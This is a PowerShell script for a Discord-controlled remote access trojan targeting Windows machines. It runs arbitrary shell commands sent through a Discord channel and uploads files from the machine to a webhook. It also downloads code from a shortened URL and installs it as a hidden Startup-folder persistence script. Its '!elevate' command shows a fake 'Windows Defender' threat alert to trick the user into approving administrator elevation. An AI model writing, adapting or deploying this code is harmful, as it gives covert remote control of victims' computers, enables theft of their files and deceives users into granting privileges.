# tested in pwsh 5.1
# this version has many "breakpoints" with write-host etc for debugging purposes" 
# usage -> .\script.ps1 -tk 'bot-token' 'channel-id-from-server'

    param (
        [Parameter(Mandatory)]
        [string]$tk, #token

        [Parameter(Mandatory)]
        [string]$cid #reference channel id
    )


    # HttpClient and Windows Forms
    Add-Type -AssemblyName 'System.Net.Http'
    Add-Type -AssemblyName "System.Windows.Forms"

    $apiBase = "https://discord.com/api/v10"
    $computerName = $env:COMPUTERNAME
    $channelName = "powershell"
    $lastMessageId = $null
    $webhookUrl = $null
    $uploadChannelLastId = $null

    $uploadSavePath = $null


    $headers = @{
        Authorization  = "Bot $tk"
        "User-Agent"   = "DiscordBot (https://discordapp.com, v1)"
        "Content-Type" = "application/json"
    }

    Write-Host "Token: $tk"
    Write-Host "Channel ID: $cid"
    
    # === for fetching reference channel
    Write-Host "Getting reference channel info..."
    $refChannel = Invoke-RestMethod -Uri "$apiBase/channels/$cid" -Headers $headers
    $guildId = $refChannel.guild_id
    if (-not $guildId) { throw "Could not determine guild ID from reference channel." }

    # === get all channels
    Write-Host "Getting channels from the dc server..."
    $channels = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" -Headers $headers

    # === category
    $category = $channels | Where-Object { $_.type -eq 4 -and $_.name -eq $computerName }

    if (-not $category) {
        Write-Host "Creating category..."
        $body = @{ name = $computerName; type = 4 } | ConvertTo-Json -Depth 3
        $category = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" -Method Post -Headers $headers -Body $body
    }

    # === text channel (powershell)
    $channel = $channels | Where-Object {
        $_.type -eq 0 -and $_.parent_id -eq $category.id -and $_.name -eq $channelName
    }

    if (-not $channel) {
        Write-Host "Creating text channel..."
        $body = @{
            name = $channelName
            type = 0
            parent_id = $category.id
        } | ConvertTo-Json -Depth 3

        $channel = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" `
            -Method Post -Headers $headers -Body $body
    }

    # === look if (upload) channel exists
    $uploadChannel = $channels | Where-Object {
        $_.type -eq 0 -and $_.parent_id -eq $category.id -and $_.name -eq "upload"
    }

    if (-not $uploadChannel) {
        Write-Host "Creating upload channel..."
        $uploadBody = @{
            name = "upload"
            type = 0
            parent_id = $category.id
        } | ConvertTo-Json -Depth 3

        $uploadChannel = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" `
            -Method Post -Headers $headers -Body $uploadBody
    }

    # === refresh channels and re-assign uploadChannel
    $channels = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" -Headers $headers
    $uploadChannel = $channels | Where-Object {
        $_.type -eq 0 -and $_.parent_id -eq $category.id -and $_.name -eq "upload"
    }

    # === webhook for powershell channel
    $existingHooks = Invoke-RestMethod -Uri "$apiBase/channels/$($channel.id)/webhooks" -Headers $headers
    $hook = $existingHooks | Where-Object { $_.name -eq "powershell-webhook" }

    if (-not $hook) {
        Write-Host "Creating webhook..."
        $body = @{ name = "powershell-webhook" } | ConvertTo-Json
        $hook = Invoke-RestMethod -Uri "$apiBase/channels/$($channel.id)/webhooks" -Method Post -Headers $headers -Body $body
    }

    $webhookUrl = "https://discord.com/api/webhooks/$($hook.id)/$($hook.token)"

    # === get last the messageIds to avoid processing old messages
    try {
        $latestMessages = Invoke-RestMethod -Uri "$apiBase/channels/$($channel.id)/messages?limit=1" -Headers $headers
        if ($latestMessages.Count -gt 0) {
            $lastMessageId = $latestMessages[0].id
            Write-Host "Starting from latest message ID: $lastMessageId"
        } else {
            Write-Host "No messages found in channel yet."
        }
    } catch {
        Write-Warning "Could not fetch initial lastMessageId: $_"
    }

    # === add and remove persistence
    function Add-Persistence {
    $persistPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
    $startupScript = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
    $remoteUrl = "https://is.gd/zVzeNh"

    try {
        "`$tk = '$tk'" | Out-File -FilePath $persistPath -Force
        "`$cid = '$cid'" | Out-File -FilePath $persistPath -Append

        Invoke-WebRequest -Uri $remoteUrl -OutFile "$env:TEMP\temp.ps1"
        Get-Content -Path "$env:TEMP\temp.ps1" | Out-File $persistPath -Append
        Remove-Item "$env:TEMP\temp.ps1" -Force

        $vbsContent = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File \"%APPDATA%\\Microsoft\\Windows\\Themes\\copy.ps1\"", 0, False
'@
        $vbsContent | Out-File -FilePath $startupScript -Force

        Write-Host "Persistence added!"
        return "Persistence added! :green_circle:"
    } catch {
        Write-Warning "Persistence setup failed: $_"
        return "Failed to add persistence."
    }
}

function Remove-Persistence {
    $persistPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
    $startupScript = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"

    try {
        Remove-Item -Path $persistPath -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $startupScript -Force -ErrorAction SilentlyContinue
        Write-Host "Persistence removed!"
        return "Persistence Removed! :red_circle:"
    } catch {
        Write-Warning "Failed to remove persistence: $_"
        return "Failed to remove persistence."
    }
}



    # === Welcome embed message
    $embed = @{
        title = "$computerName is online"
        description = "shell is ready"
        color = 5763719  # green
        fields = @(
            @{ name = "!shell <command>"; value = "execute PowerShell commands"; inline = $false },
            @{ name = "!upload-path <path>"; value = "upload a file from this PC to Discord"; inline = $false },
            @{ name = "!dc-upload <path>"; value = "change where Discord downloads go (in shell)"; inline = $false },
            @{ name = "upload channel"; value = "upload queue to the machine (needs path)"; inline = $false },
            @{ name = "!watcher-status"; value = "show the upload watcher status"; inline = $false },
            @{ name = "!add- / removepersistence"; value = "Add/Remove persistent file to the Drive"; inline = $false },
            @{ name = "!is-admin"; value = "look if the script is being runned as adm"; inline = $false },
            @{ name = "!elevate"; value = "try elevating the script to Admin with a Form and UAC"; inline = $false }
        )
        footer = @{ text = "Started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" }
        timestamp = (Get-Date).ToString("o")
    }

    $body = @{
        embeds = @($embed)
    } | ConvertTo-Json -Depth 10  # no compress etc

    # utf-8
    Invoke-RestMethod -Uri $webhookUrl -Method Post `
        -Body ([System.Text.Encoding]::UTF8.GetBytes($body)) `
        -ContentType "application/json"

    # === Main polling loop
    Write-Host "Polling started >"
    while ($true) {
        try {
            $url = "$apiBase/channels/$($channel.id)/messages"
            if ($lastMessageId) { $url += "?after=$lastMessageId" }

            $messages = Invoke-RestMethod -Uri $url -Headers $headers

            if ($messages.Count -gt 0) {
                $messages = $messages | Sort-Object id
                $lastMessageId = $messages[-1].id
            }

            foreach ($msg in $messages) {
                if ($msg.author.bot) { continue }

                $user = $msg.author.username
                $inputText = $msg.content

            # === Inline upload channel
            try {
                $uploadUrl = "$apiBase/channels/$($uploadChannel.id)/messages"
                if ($uploadChannelLastId) {
                    $uploadUrl += "?after=$uploadChannelLastId"
                }

                $uploadMessages = Invoke-RestMethod -Uri $uploadUrl -Headers $headers

                if ($uploadMessages.Count -gt 0) {
                    $uploadMessages = $uploadMessages | Sort-Object id
                    $uploadChannelLastId = $uploadMessages[-1].id  # latest Id

                    foreach ($msg in $uploadMessages) {
                        if ($msg.attachments.Count -gt 0) {
                            foreach ($file in $msg.attachments) {
                                $fileName = $file.filename
                                $fileUrl  = $file.url
                                $target   = Join-Path -Path $uploadSavePath -ChildPath $fileName

                                Invoke-WebRequest -Uri $fileUrl -OutFile $target
                                Write-Host "Saved to: $target"
                            }
                        }
                    }
                }
            } catch {
                Write-Warning "Upload polling error: $_"
            }

                # === add persistence
                if ($inputText -eq "!addpersistence") {
                    $msg = Add-Persistence
                    $body = @{ content = $msg } | ConvertTo-Json -Compress
                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
                    continue
                }

                # === remove persistence
                if ($inputText -eq "!removepersistence") {
                    $msg = Remove-Persistence
                    $body = @{ content = $msg } | ConvertTo-Json -Compress
                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
                    continue
                }


                # === upload watcher-status
                if ($inputText -eq "!watcher-status") {
                    $msg = "Watcher is active in the main loop. Current path: $uploadSavePath"
                    Write-Host $msg
                    $body = @{ content = $msg } | ConvertTo-Json -Compress
                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
                    continue
                }
                

                # === Change upload save path
                if ($inputText.StartsWith("!dc-upload ")) {
                    $newPath = $inputText.Substring(11).Trim('"')

                    if (-not (Test-Path $newPath)) {
                        try {
                            New-Item -ItemType Directory -Path $newPath -Force | Out-Null
                            $uploadSavePath = $newPath
                            $msgOut = "Created and set upload path to: $newPath"
                        } catch {
                            $msgOut = "Failed to create path: $newPath"
                        }
                    } else {
                        $uploadSavePath = $newPath
                        $msgOut = "Upload path set to: $newPath"
                    }

                    Write-Host $msgOut
                    $body = @{ content = $msgOut } | ConvertTo-Json -Compress
                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
                    continue
                }


                # === Upload from PC to Discord
                if ($inputText.StartsWith("!upload-path ")) {
                    $localPath = $inputText.Substring(13).Trim('"')
                    if (-not (Test-Path $localPath)) {
                        $errMsg = "File not found: $localPath"
                        Write-Host $errMsg -ForegroundColor Red
                        $body = @{ content = $errMsg } | ConvertTo-Json -Compress
                        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
                        continue
                    }

                    try {
                        $httpClient = New-Object System.Net.Http.HttpClient
                        $form = New-Object System.Net.Http.MultipartFormDataContent
                        $fs = [System.IO.File]::OpenRead($localPath)
                        $fileContent = New-Object System.Net.Http.StreamContent($fs)
                        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
                        $fileContent.Headers.Add("Content-Disposition", "form-data; name=`"file1`"; filename=`"$([System.IO.Path]::GetFileName($localPath))`"")
                        $form.Add($fileContent, "file1", [System.IO.Path]::GetFileName($localPath))

                        $payload = @{ content = "$user uploaded: $([System.IO.Path]::GetFileName($localPath))" } | ConvertTo-Json -Compress
                        $payloadContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
                        $form.Add($payloadContent, "payload_json")

                        $null = $httpClient.PostAsync($webhookUrl, $form).Result
                        $fs.Dispose()

                        Write-Host "Uploaded file: $localPath"
                    } catch {
                        $errMsg = "Failed to upload file: $_"
                        Write-Host $errMsg -ForegroundColor Red
                        $body = @{ content = $errMsg } | ConvertTo-Json -Compress
                        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
                    }

                    continue
                }

                # === Check if running as Administrator
                if ($inputText -eq "!is-admin") {
                    $isAdmin = ([Security.Principal.WindowsPrincipal] `
                        [Security.Principal.WindowsIdentity]::GetCurrent()
                    ).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)

                    $msg = if ($isAdmin) {
                        "This script is running with administrator privileges."
                    } else {
                        "This script is **NOT** being runned as administrator."
                    }

                    Write-Host $msg
                    $body = @{ content = $msg } | ConvertTo-Json -Compress
                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
                    continue
                }

                # === Elevate Script Privileges
                if ($inputText -eq "!elevate") {
                    Write-Host "received !elevate command"
                    $msgOut = ""

                    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)

                    if ($isAdmin) {
                        $msgOut = "The Script is Already"
                        Write-Host $msgOut
                    } else {
                        $message = "Windows Defender has detected potential threats on your system. To ensure the safety of your computer, a quick scan is recommended."
                        $title = "Windows Defender"
                        $button = [System.Windows.Forms.MessageBoxButtons]::OK
                        $icon = [System.Windows.Forms.MessageBoxIcon]::Information

                        try {
                            $result = [System.Windows.Forms.MessageBox]::Show($message, $title, $button, $icon)

                            if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
                                Write-Host "User clicked ok. Attempting to elevate..."
                                try {
                                    $scriptPath = $MyInvocation.MyCommand.Definition
                                    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" -tk `"$tk`" -cid `"$cid`""

                                    Start-Process powershell -ArgumentList $arguments -Verb RunAs -ErrorAction Stop

                                    Write-Host "Elevation process requested. Exiting current script."
                                    exit
                                } catch {
                                    $errorMessage = "Error in Elevation $($_.Exception.Message)"
                                    Write-Warning $errorMessage
                                    $msgOut = $errorMessage
                                }
                            } else {
                                $msgOut = "Failure in Elevation"
                                Write-Host $msgOut
                            }
                        } catch {
                            $errorMessage = " Error:  $($_.Exception.Message)"
                            Write-Warning $errorMessage
                            $msgOut = $errorMessage
                        }
                    }

                    if ($msgOut) {
                        $body = @{ content = $msgOut } | ConvertTo-Json -Compress
                        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" | Out-Null
                    }
                    continue
                } # end if ($inputText -eq "!elevate")

                # === Execute Shell Command
                if (-not $inputText.StartsWith("!shell ")) { continue }
                $command = $inputText.Substring(7)
                Write-Host "Executing command from ${user}: ${command}"

                try {
                    $result = powershell.exe -NoProfile -Command "& { `$ErrorActionPreference='Stop'; $command }" 2>&1
                    if (-not $result) { $result = "_(no output)_" }

                    Write-Host "`nResult from ${user}:" -ForegroundColor Cyan
                    Write-Host $result -ForegroundColor White

                    $maxLength = 2000
                    $backtick = '```'
                    $formatted = "$user output:`n${backtick}powershell`n$result`n$backtick"

                    if ($formatted.Length -le $maxLength) {
                        $body = @{ content = $formatted } | ConvertTo-Json -Compress
                        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
                    } else {
                        $tempPath = Join-Path $env:TEMP "output_${user}_$((Get-Random).ToString('X4')).txt"
                        $result | Out-File -FilePath $tempPath -Encoding UTF8

                        $httpClient = New-Object System.Net.Http.HttpClient
                        $form = New-Object System.Net.Http.MultipartFormDataContent
                        $fs = [System.IO.File]::OpenRead($tempPath)
                        $fileContent = New-Object System.Net.Http.StreamContent($fs)
                        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("text/plain")
                        $fileContent.Headers.Add("Content-Disposition", "form-data; name=`"file1`"; filename=`"$([System.IO.Path]::GetFileName($tempPath))`"")

                        $form.Add($fileContent, "file1", [System.IO.Path]::GetFileName($tempPath))
                        $payload = @{ content = "$user output (uploaded as file):" } | ConvertTo-Json -Compress
                        $payloadContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
                        $form.Add($payloadContent, "payload_json")

                        $null = $httpClient.PostAsync($webhookUrl, $form).Result
                        $fs.Dispose()
                        Remove-Item $tempPath -Force
                    }
                } catch {
                    $errorMessage = "Command failed: $_"
                    Write-Host $errorMessage -ForegroundColor Red
                    $body = @{ content = $errorMessage } | ConvertTo-Json -Compress
                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
                }
            }
        } catch {
            Write-Host "Polling error: $_"
        }

        Start-Sleep -Seconds 5
    }
